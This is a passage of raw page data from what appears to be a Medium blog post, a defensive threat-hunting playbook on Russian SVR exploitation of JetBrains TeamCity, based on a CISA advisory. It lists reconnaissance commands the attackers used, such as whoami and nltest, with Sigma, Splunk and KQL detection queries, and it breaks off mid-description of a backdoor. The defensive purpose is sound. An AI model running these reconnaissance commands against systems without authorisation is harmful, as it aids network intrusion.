1bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"medium.com\"})":null,"postResult({\"id\":\"1b40810f8552\"})":{"__ref":"Post:1b40810f8552"}},"MastodonAccount:simonekrausocd@me.dm":{"__typename":"MastodonAccount","domain":"me.dm","username":"simonekrausocd","id":"simonekrausocd@me.dm"},"LinkedAccounts:3d60ce83d2f7":{"__typename":"LinkedAccounts","mastodon":{"__ref":"MastodonAccount:simonekrausocd@me.dm"},"id":"3d60ce83d2f7"},"Membership:66a5397aa375":{"__typename":"Membership","tier":"MEMBER","id":"66a5397aa375"},"User:3d60ce83d2f7":{"__typename":"User","id":"3d60ce83d2f7","linkedAccounts":{"__ref":"LinkedAccounts:3d60ce83d2f7"},"isSuspended":false,"name":"SIMKRA","imageId":"1*BIfekvQdxa7JrHyPD8XJVw.png","customDomainState":null,"hasSubdomain":false,"username":"simone.kraus","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":536,"followingCount":173,"collectionFollowingCount":23},"bio":"","membership":{"__ref":"Membership:66a5397aa375"},"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:3d60ce83d2f7-viewerId:lo_13f2cb9b2f93"},"twitterScreenName":""},"Paragraph:f69d26ea209e_0":{"__typename":"Paragraph","id":"f69d26ea209e_0","name":"b442","type":"H3","href":null,"layout":null,"metadata":null,"text":"Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_1":{"__typename":"Paragraph","id":"f69d26ea209e_1","name":"0602","type":"H4","href":null,"layout":null,"metadata":null,"text":"Behavior Patterns","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_2":{"__typename":"Paragraph","id":"f69d26ea209e_2","name":"8b69","type":"BQ","href":null,"layout":null,"metadata":null,"text":"SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_3":{"__typename":"Paragraph","id":"f69d26ea209e_3","name":"05bc","type":"P","href":null,"layout":null,"metadata":null,"text":"…","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_4":{"__typename":"Paragraph","id":"f69d26ea209e_4","name":"4fb3","type":"BQ","href":null,"layout":null,"metadata":null,"text":"In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023–42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.","hasDropCap":true,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_5":{"__typename":"Paragraph","id":"f69d26ea209e_5","name":"dfff","type":"P","href":null,"layout":null,"metadata":null,"text":"The playbook is written based on the CISA Alert Code AA23–347A and contains corresponding Sigma Rules for threat hunting. It contains additionally a threat hunting Sigma Rule opportunity for living off the land and exploitation commands exploiting active directory and one for the EDRSandblast detection, that the SVR is also using in some cases.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":37,"end":62,"href":"https:\u002F\u002Fwww.cisa.gov\u002Fnews-events\u002Fcybersecurity-advisories\u002Faa23-347a","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":52,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_6":{"__typename":"Paragraph","id":"f69d26ea209e_6","name":"e490","type":"H4","href":null,"layout":null,"metadata":null,"text":"Host Reconnaissance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_7":{"__typename":"Paragraph","id":"f69d26ea209e_7","name":"242f","type":"H4","href":null,"layout":null,"metadata":null,"text":"whoami","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_8":{"__typename":"Paragraph","id":"f69d26ea209e_8","name":"889b","type":"P","href":null,"layout":null,"metadata":null,"text":"Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [T1033]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_9":{"__typename":"Paragraph","id":"f69d26ea209e_9","name":"5a94","type":"PRE","href":null,"layout":null,"metadata":null,"text":"whoami \u002Fpriv","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_10":{"__typename":"Paragraph","id":"f69d26ea209e_10","name":"a281","type":"PRE","href":null,"layout":null,"metadata":null,"text":"whoami \u002Fall","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_11":{"__typename":"Paragraph","id":"f69d26ea209e_11","name":"61cd","type":"PRE","href":null,"layout":null,"metadata":null,"text":"whoami \u002Fgroups","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_12":{"__typename":"Paragraph","id":"f69d26ea209e_12","name":"2342","type":"PRE","href":null,"layout":null,"metadata":null,"text":"whoami \u002Fdomain","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_13":{"__typename":"Paragraph","id":"f69d26ea209e_13","name":"e0d3","type":"H4","href":null,"layout":null,"metadata":null,"text":"Privilege information listing via whoami","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_14":{"__typename":"Paragraph","id":"f69d26ea209e_14","name":"619b","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FPrivilege information listing via whoami.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FPrivilege%20information%20listing%20via%20whoami.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FPrivilege%20information%20listing%20via%20whoami.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*x5quL_eA2uYcvZDO"}},"Paragraph:f69d26ea209e_15":{"__typename":"Paragraph","id":"f69d26ea209e_15","name":"9c23","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_16":{"__typename":"Paragraph","id":"f69d26ea209e_16","name":"4e35","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*whoami.exe’”) AND (CommandLine=”*priv*” OR CommandLine=”*Priv*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_17":{"__typename":"Paragraph","id":"f69d26ea209e_17","name":"6062","type":"H4","href":null,"layout":null,"metadata":null,"text":"Whoami.exe Russian SVR JetBrains","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_18":{"__typename":"Paragraph","id":"f69d26ea209e_18","name":"cf56","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FWhoami.exe Russian SVR JetBrains.yml at Russian-Threat-Actor · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":223,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FWhoami.exe%20Russian%20SVR%20JetBrains.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":99,"end":213,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FWhoami.exe%20Russian%20SVR%20JetBrains.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*bXjbNVLUoLtNMdfQ"}},"Paragraph:f69d26ea209e_19":{"__typename":"Paragraph","id":"f69d26ea209e_19","name":"cbd0","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_20":{"__typename":"Paragraph","id":"f69d26ea209e_20","name":"205e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\whoami.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’whoami.exe’ or ProcessVersionInfoOriginalFileName =~ @’whoami.exe’) and (ProcessCommandLine contains @’ \u002Fpriv’ or ProcessCommandLine contains @’ \u002Fall’ or ProcessCommandLine contains @’ \u002Fgroups’ or ProcessCommandLine contains @’ \u002Fdomain’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_21":{"__typename":"Paragraph","id":"f69d26ea209e_21","name":"2db1","type":"H4","href":null,"layout":null,"metadata":null,"text":"DC listing via nltest","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_22":{"__typename":"Paragraph","id":"f69d26ea209e_22","name":"bde9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"nltest -dclist","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_23":{"__typename":"Paragraph","id":"f69d26ea209e_23","name":"e8e8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"nltest -dsgetd","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_24":{"__typename":"Paragraph","id":"f69d26ea209e_24","name":"e34c","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FDC listing via nltest.yml at Russian-Threat-Actor · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":212,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDC%20listing%20via%20nltest.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":88,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDC%20listing%20via%20nltest.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*_UMpTa8D2WoWuQDJ"}},"Paragraph:f69d26ea209e_25":{"__typename":"Paragraph","id":"f69d26ea209e_25","name":"4292","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_26":{"__typename":"Paragraph","id":"f69d26ea209e_26","name":"2cce","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (FolderPath endswith @’nltest.exe’ and (ProcessCommandLine matches regex @’(?i).*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_27":{"__typename":"Paragraph","id":"f69d26ea209e_27","name":"0962","type":"H4","href":null,"layout":null,"metadata":null,"text":"DLL execution via WMI","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_28":{"__typename":"Paragraph","id":"f69d26ea209e_28","name":"aa4a","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FDLL execution via WMI.yml at Russian-Threat-Actor · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":212,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDLL%20execution%20via%20WMI.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":88,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDLL%20execution%20via%20WMI.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*vQ24-uQ9mf2E6I8P"}},"Paragraph:f69d26ea209e_29":{"__typename":"Paragraph","id":"f69d26ea209e_29","name":"f486","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_30":{"__typename":"Paragraph","id":"f69d26ea209e_30","name":"6b3d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (FolderPath endswith @’WMIC.exe’ and (ProcessCommandLine contains @’call’ or ProcessCommandLine contains @’rundll32'))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_31":{"__typename":"Paragraph","id":"f69d26ea209e_31","name":"8e04","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_32":{"__typename":"Paragraph","id":"f69d26ea209e_32","name":"0823","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*WMIC.exe”) AND (CommandLine=”*call*” OR CommandLine=”*rundll32*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_33":{"__typename":"Paragraph","id":"f69d26ea209e_33","name":"05bf","type":"H4","href":null,"layout":null,"metadata":null,"text":"Process with connect and pass as args","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_34":{"__typename":"Paragraph","id":"f69d26ea209e_34","name":"e3f0","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FProcess with connect and pass as args.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":205,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FProcess%20with%20connect%20and%20pass%20as%20args.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":80,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":81,"end":195,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FProcess%20with%20connect%20and%20pass%20as%20args.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*6MSP1IXkzImFeHHC"}},"Paragraph:f69d26ea209e_35":{"__typename":"Paragraph","id":"f69d26ea209e_35","name":"6dfc","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_36":{"__typename":"Paragraph","id":"f69d26ea209e_36","name":"b7f3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (ProcessCommandLine contains @’pass’ and ProcessCommandLine contains @’connect’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_37":{"__typename":"Paragraph","id":"f69d26ea209e_37","name":"cbeb","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_38":{"__typename":"Paragraph","id":"f69d26ea209e_38","name":"3df2","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((CommandLine=”*pass*”) AND (CommandLine=”*connect*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_39":{"__typename":"Paragraph","id":"f69d26ea209e_39","name":"4740","type":"H4","href":null,"layout":null,"metadata":null,"text":"Service or Drive enumeration via powershell","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_40":{"__typename":"Paragraph","id":"f69d26ea209e_40","name":"f374","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FService or Drive enumeration via powershell.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FService%20or%20Drive%20enumeration%20via%20powershell.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":87,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FService%20or%20Drive%20enumeration%20via%20powershell.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*HWHPWezwfiWRknk6"}},"Paragraph:f69d26ea209e_41":{"__typename":"Paragraph","id":"f69d26ea209e_41","name":"1e1e","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_42":{"__typename":"Paragraph","id":"f69d26ea209e_42","name":"e73d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceEvents | where ActionType == “PowerShellCommand” | where (((AdditionalFields contains @’Get-WmiObject’ or InitiatingProcessCommandLine contains @’Get-WmiObject’) and (AdditionalFields contains @’-Class’ or InitiatingProcessCommandLine contains @’-Class’) and (AdditionalFields contains @’Win32_Service’ or InitiatingProcessCommandLine contains @’Win32_Service’)) or ((AdditionalFields contains @’Get-WindowsDriver’ or InitiatingProcessCommandLine contains @’Get-WindowsDriver’) and (AdditionalFields contains @’-Online’ or InitiatingProcessCommandLine contains @’-Online’) and (AdditionalFields contains @’-All’ or InitiatingProcessCommandLine contains @’-All’)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_43":{"__typename":"Paragraph","id":"f69d26ea209e_43","name":"1ca0","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_44":{"__typename":"Paragraph","id":"f69d26ea209e_44","name":"afa4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (((ScriptBlockText=”*Get-WmiObject*”) AND (ScriptBlockText=”*-Class*”) AND (ScriptBlockText=”*Win32_Service*”)) OR ((ScriptBlockText=”*Get-WindowsDriver*”) AND (ScriptBlockText=”*-Online*”) AND (ScriptBlockText=”*-All*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_45":{"__typename":"Paragraph","id":"f69d26ea209e_45","name":"925c","type":"H4","href":null,"layout":null,"metadata":null,"text":"DLL names used by SVR for GraphicalProton backdoor","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_46":{"__typename":"Paragraph","id":"f69d26ea209e_46","name":"83bb","type":"BQ","href":null,"layout":null,"metadata":null,"text":"GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [T1027.001] to exchange data with the SVR operator.  After execution, GraphicalProton gathers environment information such as active TCP\u002FUDP connections [T1049], running processes [T1049], as well as user, host, and domain names [T1590]. OneDrive is 